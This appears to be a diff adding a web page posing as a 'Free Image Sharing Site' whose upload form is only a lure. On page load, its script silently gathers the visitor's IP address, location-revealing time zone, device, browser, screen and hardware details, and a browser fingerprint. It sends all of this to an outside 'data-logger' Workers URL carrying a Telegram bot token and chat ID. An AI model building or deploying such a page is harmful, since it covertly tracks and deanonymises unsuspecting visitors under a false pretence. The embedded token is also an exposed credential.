@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Image Sharing Site</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f7f7f7;
+      padding: 2rem;
+      line-height: 1.5;
+    }
+    h1 {
+      font-size: 1.6rem;
+      margin-bottom: 1rem;
+    }
+    pre {
+      background: #eee;
+      padding: 1rem;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      overflow-x: auto;
+    }
+  </style>
+
+  <!-- UAParser for device/browser detection -->
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.36/dist/ua-parser.min.js"></script>
+  <!-- FingerprintJS v3 (classic non-module version) -->
+  <script src="https://cdn.jsdelivr.net/npm/fingerprintjs2@2.1.0/dist/fingerprint2.min.js"></script>
+</head>
+<body>
+  <h1>Free Image Sharing Site</h1>
+  <pre id="output">Upload Image</pre>
+  <input type="file" name="test" id="">
+  <input type="button" value="upload">
+
+  <script>
+    async function getIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return 'Unavailable';
+      }
+    }
+
+    function getTimeInfo() {
+      const now = new Date();
+      return {
+        localDate: now.toLocaleDateString(),
+        localTime: now.toLocaleTimeString(),
+        isoDateTime: now.toISOString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffsetMinutes: now.getTimezoneOffset(),
+        GMT: new Date().toString().match(/([A-Z]+[\+-][0-9]+.*)/)[1]
+      };
+    }
+
+    function getDeviceInfo() {
+      const parser = new UAParser();
+      const ua = parser.getResult();
+      return {
+        deviceType: ua.device.type || 'Desktop',
+        deviceBrand: ua.device.vendor || 'Unknown',
+        deviceModel: ua.device.model || 'Unknown',
+        os: `${ua.os.name} ${ua.os.version}`,
+        browser: `${ua.browser.name} ${ua.browser.version}`,
+        cpuArchitecture: ua.cpu.architecture || 'Unknown',
+        userAgent: navigator.userAgent,
+        connection: navigator.connection.type // sometimes gives 'cellular'
+      };
+    }
+
+    function getSystemInfo() {
+      return {
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        cookiesEnabled: navigator.cookieEnabled,
+        deviceMemory: navigator.deviceMemory || 'Unknown',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
+      };
+    }
+
+    function getScreenInfo() {
+      return {
+        screenResolution: `${screen.width} x ${screen.height}`,
+        availableScreen: `${screen.availWidth} x ${screen.availHeight}`,
+        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        fullScreenSupported: document.fullscreenEnabled
+      };
+    }
+
+    function getFeatureSupport() {
+      return {
+        localStorageSupported: typeof localStorage !== 'undefined',
+        sessionStorageSupported: typeof sessionStorage !== 'undefined',
+        indexedDBSupported: typeof indexedDB !== 'undefined',
+        webGLSupported: (() => {
+          try {
+            const canvas = document.createElement('canvas');
+            return !!(window.WebGLRenderingContext && canvas.getContext('webgl'));
+          } catch {
+            return false;
+          }
+        })(),
+        serviceWorkerSupported: 'serviceWorker' in navigator,
+        mediaDevicesSupported: 'mediaDevices' in navigator
+      };
+    }
+
+    async function collectAllInfo() {
+      const ip = await getIP();
+
+      // Wait for fingerprint after slight delay (required by FP2)
+      setTimeout(() => {
+        Fingerprint2.get(components => {
+          const fingerprintHash = Fingerprint2.x64hash128(
+            components.map(c => c.value).join(''), 31
+          );
+
+          const info = {
+            ipAddress: ip,
+            ...getTimeInfo(),
+            ...getDeviceInfo(),
+            ...getSystemInfo(),
+            ...getScreenInfo(),
+            ...getFeatureSupport(),
+            referrer: document.referrer || 'None',
+            fingerprintID: fingerprintHash
+          };
+          
+          const apiUrl = `https://data-logger.vatico2180.workers.dev/?botToken=6674541741:AAFWtQQW6WaKRfQ5Q_4Qkr2gTJVjYhEmas0&chatId=1088171486&caption=${encodeURIComponent("<pre>"+JSON.stringify(info, null, 2)+"</pre>")}`;
+      
+      // Make a fetch request to the constructed URL
+      try {
+        const response = fetch(apiUrl);
+        // Handle the response if needed
+      } catch (error) {
+        // Handle errors here
+      }
+
+          // document.getElementById('output').textContent = JSON.stringify(info, null, 2);
+        });
+      }, 500); // give time for entropy-gathering
+    }
+
+    collectAllInfo();
+  </script>
+</body>
+</html>
